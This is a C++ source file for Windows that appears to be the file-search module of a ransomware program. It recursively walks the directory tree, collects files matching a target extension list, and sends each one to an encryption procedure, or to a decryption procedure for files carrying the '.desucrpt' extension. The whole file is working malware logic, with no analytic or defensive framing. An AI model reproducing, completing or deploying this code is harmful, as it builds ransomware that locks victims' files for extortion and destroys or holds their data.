
#include "stdafx.h"
#include "fssearch.h"



void filesystem::writeCurPath() {
	GetCurrentDirectory(MAX_PATH, curPath);
}
void filesystem::writeFileDB() {
	filesystem::writeCurPath();
	std::wstring element(curPath);
	element += std::wstring(L"\\");
	element += std::wstring(curItem.cFileName);
	filesDB.push_back(element);
}
bool filesystem::isIgnoredDir(const wchar_t *dirName)
{

	for(int count=0;count<(sizeof(ignoreDirs)/sizeof(ignoreDirs[0]));count++)
	{
		if (wcscmp(dirName, ignoreDirs[count]) == 0)
		{
			return true;
		}
	}
	return false;
}
bool filesystem::checkEncFile(const wchar_t *fileName) {
	std::wstring ext(fileName);
	unsigned int res=0;
	res =ext.find_last_of('.');
	if(res>ext.length()){
		return false;
	}
	ext = ext.substr(ext.find_last_of('.'));
	if (wcscmp(ext.c_str(), L".desucrpt") == 0)
	{
		return true;
	}
	return false;
}
bool filesystem::checkFile(const wchar_t *fileName)
{
	std::wstring ext(fileName);
	unsigned int res = 0;
	res = ext.find_last_of('.');
	if (res>ext.length()) {
		return false;
	}
	ext = ext.substr(ext.find_last_of('.'));
	for (unsigned long int i = 0; i < sizeof(fileExts)/sizeof(fileExts[0]); i++) {
		if (wcscmp(ext.c_str(), fileExts[i]) == 0)
		{
			return true;
		}
	}
	return false;
}


void filesystem::rWalking(const wchar_t *dirName, const bool ifBase) {
	if(_wchdir(dirName)!=0)
	{
		return;
	}
	auto HFile = new HANDLE;
	*HFile = FindFirstFile(L"*", &curItem);
	if(1) {
		while(FindNextFile(*HFile, &curItem) != 0)
		{
			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (!isIgnoredDir((curItem.cFileName))) {
					filesystem::rWalking(curItem.cFileName, false);
				}
			}
			else
			{
				if (checkFile(curItem.cFileName)) {
					writeFileDB();
				}
			}
		};
		if (!ifBase) {
			_wchdir(L"..");
		}
		delete HFile; // never forget
		return;
	}
}
void filesystem::searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
	if (_wchdir(dirName) != 0)
	{
		return;
	}
	auto HFile = new HANDLE;
	*HFile = FindFirstFile(L"*", &curItem);
	if (1) {
		while (FindNextFile(*HFile, &curItem) != 0)
		{

			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{

				if (!isIgnoredDir(curItem.cFileName)) {
					//_tprintf(TEXT("  %s   <DIR>\n"), curItem.cFileName);
					searchForEncryptedFiles(curItem.cFileName, false);
				}
			}
			else
			{
				if (checkEncFile(curItem.cFileName) == true) {
					writeFileDB();
				}

			}
		};
		if (!ifBase) {
			_wchdir(L"..");
		}
		//CloseHandle(*HFile);
		delete HFile; // never forget
		return;
	}
}

filesystem::filesystem()
{
}

filesystem::~filesystem()
{
}

void filesystem::iterateFilesDB(BOOL action)
{
	file fileObj;
	for (unsigned long int i = 0; i < filesDB.size(); i++) {
		if (action == TRUE) {
			fileObj.startProcedureOnFile(filesDB.at(i), &CryptObj);
		}
		if (action == FALSE) {
			fileObj.decryptProcedure(filesDB.at(i), &CryptObj);
		}

	}
}
